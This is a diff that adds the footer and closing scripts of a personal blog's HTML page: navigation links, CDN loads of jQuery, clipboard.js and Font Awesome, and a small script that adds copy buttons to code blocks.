+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2026
+    River
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Archive</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+    <script src="/js/oneko.js"></script>
+</body>
+</html>
